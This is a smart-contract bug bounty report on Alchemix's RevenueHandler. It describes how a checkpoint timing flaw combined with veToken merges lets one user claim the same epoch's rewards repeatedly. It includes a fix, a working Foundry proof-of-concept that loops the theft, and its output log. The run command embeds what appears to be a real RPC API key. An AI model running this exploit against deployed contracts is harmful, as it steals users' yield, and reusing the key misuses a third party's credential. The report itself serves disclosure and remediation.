# 31242 - \[SC - Critical] RevenueHandlercheckpoint allows users to claim ...

Submitted on May 15th 2024 at 19:01:43 UTC by @yttriumzz for [Boost | Alchemix](https://immunefi.com/bounty/alchemix-boost/)

Report ID: #31242

Report type: Smart Contract

Report severity: Critical

Target: <https://github.com/alchemix-finance/alchemix-v2-dao/blob/main/src/RevenueHandler.sol>

Impacts:

* Theft of unclaimed yield

## Description

## Brief/Intro

The `RevenueHandler` contract receives the revenue from Alchemix protocol. One part of the revenue is sent to the treasury. The rest is distributed to users that have $veToken. Each $veToken can claim rewards once per epoch. Anyone can call the `RevenueHandler.checkpoint` interface to refresh the `currentEpoch`. However, the `checkpoint` interface allows the `currentEpoch` to be updated to the timestamp of the current block, allowing attackers to use `VotingEscrow.merge` to repeatedly claim rewards.

## Vulnerability Details

Please look at the following code. When `block.timestamp` is equal to `currentEpoch + WEEK`, `currentEpoch` is updated to `block.timestamp`.

```solidity
///// https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/RevenueHandler.sol#L228-L231
    function checkpoint() public {
        // only run checkpoint() once per epoch
        if (block.timestamp >= currentEpoch + WEEK /* && initializer == address(0) */) {
            currentEpoch = (block.timestamp / WEEK) * WEEK;
```

The `RevenueHandler` contract calculates the number of rewards that can be claimed for a certain $veToken based on the value of the $veToken at the `currentEpoch` time point. Please see the code below.

```solidity
///// https://github.com/alchemix-finance/alchemix-v2-dao/blob/f1007439ad3a32e412468c4c42f62f676822dc1f/src/RevenueHandler.sol#L314-L324
        for (
            uint256 epochTimestamp = lastClaimEpochTimestamp + WEEK;
            epochTimestamp <= currentEpoch;
            epochTimestamp += WEEK
        ) {
            uint256 epochTotalVeSupply = IVotingEscrow(veALCX).totalSupplyAtT(epochTimestamp);
            if (epochTotalVeSupply == 0) continue;
            uint256 epochRevenue = epochRevenues[epochTimestamp][token];
            uint256 epochUserVeBalance = IVotingEscrow(veALCX).balanceOfTokenAt(tokenId, epochTimestamp);
            totalClaimable += (epochRevenue * epochUserVeBalance) / epochTotalVeSupply;
        }
```

If `currentEpoch` can be set as the timestamp of the current block, then after the user claim the $veToken reward in the current block, he can transfer the value of $veToken to another $veToken through `VotingEscrow.merge` to continue claim it. The attack steps are briefly described below. Please see the PoC for details.

1. When the `block.timestamp` of the block happens to be `currentEpoch + WEEK`, the attacker calls `RevenueHandler.checkpoint` to update `currentEpoch` to `block.timestamp`
2. The attacker mints a $veTokenA and claim the reward
3. The attacker mints a $veTokenTemp worth 1 wei with a cost of `~0`
4. The attacker merges $veTokenA into $veTokenTemp and claim rewards for $veTokenTemp
5. Treat $veTokenTemp as $veTokenA and go back to Step2

Note that all the above steps are run in the same block.

**Suggested fix**

Users should only be able to claim past rewards

```diff
    function checkpoint() public {
        // only run checkpoint() once per epoch
-       if (block.timestamp >= currentEpoch + WEEK /* && initializer == address(0) */) {
+       if (block.timestamp > currentEpoch + WEEK /* && initializer == address(0) */) {
            currentEpoch = (block.timestamp / WEEK) * WEEK;
```

## Impact Details

Users can claim rewards repeatedly

## References

None

## Proof of Concept

The PoC patch

```diff
diff --git a/src/test/RevenueHandler.t.sol b/src/test/RevenueHandler.t.sol
index 7908478..dab62e9 100644
--- a/src/test/RevenueHandler.t.sol
+++ b/src/test/RevenueHandler.t.sol
@@ -644,4 +644,62 @@ contract RevenueHandlerTest is BaseTest {
         revenueHandler.setTreasury(admin);
         assertEq(revenueHandler.treasury(), admin, "treasury should be admin");
     }
+
+    function testYttriumzzPocTemp() external {
+        // 0. Init test env
+        vm.warp((block.timestamp / 2 weeks) * 2 weeks);
+        hevm.startPrank(admin);
+        deal(bpt, admin, 10000e18);
+        IERC20(bpt).approve(address(veALCX),  type(uint256).max);
+        veALCX.checkpoint();
+        veALCX.createLock(10000e18, 0, true);
+        hevm.stopPrank();
+
+        // 1. Start test and init BPT token
+        address attacker = address(0xa77ac8e3);
+        hevm.startPrank(attacker);
+        console.log(">>>>> Init balance of rewards token");
+        console.log(">> bal.balanceOf(attacker): %s", IERC20(bal).balanceOf(attacker));
+        console.log();
+
+        deal(bpt, attacker, 10000e18);
+        IERC20(bpt).approve(address(veALCX),  type(uint256).max);
+
+        // 2. Checkpoint RevenueHandler
+        //    It is required that `block.timestamp` is exactly `currentEpoch + WEEK`, `block.timestamp` is in seconds, so it is likely to happen.
+        deal(bal, address(revenueHandler), 100e18);
+        vm.warp(block.timestamp + 2 weeks);
+        revenueHandler.checkpoint();
+
+        // 3. Start steal rewards
+        //    Step 3 and step 2 exist in the same block
+        console.log(">>>>> Claim the veToken");
+        veALCX.checkpoint();
+        uint256 tokenId1 = veALCX.createLock(1e18, 0, true);
+        revenueHandler.claim(tokenId1, bal, address(0), revenueHandler.claimable(tokenId1, bal), attacker);
+        console.log(">> bal.balanceOf(attacker): %s", IERC20(bal).balanceOf(attacker));
+        console.log();
+
+        console.log(">>>>> Start steal rewards 50 times");
+        for (uint256 i = 0; i < 50; i++) {
+            uint256 tokenIdTemp = veALCX.createLock(1, 0, true);
+            veALCX.merge(tokenId1, tokenIdTemp);
+            revenueHandler.claim(tokenIdTemp, bal, address(0), revenueHandler.claimable(tokenIdTemp, bal), attacker);
+            tokenId1 = tokenIdTemp;
+        }
+        console.log(">> bal.balanceOf(attacker): %s", IERC20(bal).balanceOf(attacker));
+        console.log();
+
+        console.log(">>>>> Start steal rewards 100 times");
+        for (uint256 i = 0; i < 100; i++) {
+            uint256 tokenIdTemp = veALCX.createLock(1, 0, true);
+            veALCX.merge(tokenId1, tokenIdTemp);
+            revenueHandler.claim(tokenIdTemp, bal, address(0), revenueHandler.claimable(tokenIdTemp, bal), attacker);
+            tokenId1 = tokenIdTemp;
+        }
+        console.log(">> bal.balanceOf(attacker): %s", IERC20(bal).balanceOf(attacker));
+        console.log();
+
+        hevm.stopPrank();
+    }
 }
```

Run the PoC

```bash
FOUNDRY_PROFILE=default forge test --fork-url https://eth-mainnet.alchemyapi.io/v2/VFefkgjj8h3SgRYcCvmtp9KoMJJij6gD --fork-block-number 17133822 -vvv --match-test testYttriumzzPocTemp
```

The log

```bash
$ FOUNDRY_PROFILE=default forge test --fork-url https://eth-mainnet.alchemyapi.io/v2/VFefkgjj8h3SgRYcCvmtp9KoMJJij6gD --fork-block-number 17133822 -vvv --match-test testYttriumzzPocTemp
[⠊] Compiling...
No files changed, compilation skipped

Ran 1 test for src/test/RevenueHandler.t.sol:RevenueHandlerTest
[PASS] testYttriumzzPocTemp() (gas: 118159985)
Logs:
  >>>>> Init balance of rewards token
  >> bal.balanceOf(attacker): 0
  
  >>>>> Claim the veToken
  >> bal.balanceOf(attacker): 9999000099906589
  
  >>>>> Start steal rewards 50 times
  >> bal.balanceOf(attacker): 509949005095236039
  
  >>>>> Start steal rewards 100 times
  >> bal.balanceOf(attacker): 1509849015085894939
  

Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 458.15ms (442.17ms CPU time)

Ran 1 test suite in 2.09s (458.15ms CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
